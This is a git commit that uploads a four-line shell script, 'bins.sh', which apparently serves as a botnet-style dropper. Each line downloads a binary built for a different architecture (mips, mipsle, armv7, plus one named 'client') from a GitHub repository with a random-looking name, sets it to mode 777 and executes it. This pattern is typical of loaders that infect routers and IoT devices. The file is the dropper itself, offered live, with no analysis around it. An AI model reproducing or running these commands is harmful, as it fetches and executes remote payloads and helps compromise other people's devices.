6b573f4b1b465ff0ae3c569294e6fc9cbe8f448f
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-11 15:05:12 +0500

    Add files via upload

---
+++ bins.sh
@@ -0,0 +1,4 @@
+wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips
+wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mipsle; chmod 777 mipsle; ./mipsle
+wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/armv7; chmod 777 armv7; ./armv7
+wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client; chmod 777 client; ./client
